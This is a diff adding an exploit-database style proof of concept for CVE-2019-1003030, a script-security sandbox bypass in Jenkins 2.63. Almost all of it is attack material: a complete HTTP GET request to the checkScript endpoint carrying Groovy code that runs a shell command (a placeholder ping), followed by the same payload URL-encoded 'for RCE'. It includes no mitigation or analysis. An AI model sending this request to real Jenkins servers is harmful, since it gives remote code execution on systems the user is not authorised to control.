@@ -1,0 +1,33 @@
+# Exploit Title: Jenkins 2.63 - Sandbox bypass in pipeline: Groovy plug-in
+# Date: 8th October 2020
+# Exploit Author: dmw0ng
+# Vendor Homepage: https://www.jenkins.io
+# Software Link: http://archives.jenkins-ci.org/windows/jenkins-2.63.zip
+# Version: Jenkins 2.63
+# Tested on: Ubuntu 18.04 / 20.04
+# CVE : CVE-2019-1003030
+
+GET /jenkinselj/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public class x {
+  public x(){
+"ping -c 1 xx.xx.xx.xx".execute()
+}
+} HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID.4495c8e0=node01jguwrtw481dx1bf3gaoq5o6no32.node0
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+URL Encoding the following for RCE
+```public class x {
+  public x(){
+"ping -c 1 xx.xx.xx.xx".execute()
+}
+} ```
+
+to
+
+%70%75%62%6c%69%63%20%63%6c%61%73%73%20%78%20%7b%0a%20%20%70%75%62%6c%69%63%20%78%28%29%7b%0a%22%70%69%6e%67%20%2d%63%20%31%20%78%78%2e%78%78%2e%78%78%2e%78%78%22%2e%65%78%65%63%75%74%65%28%29%0a%7d%0a%7d
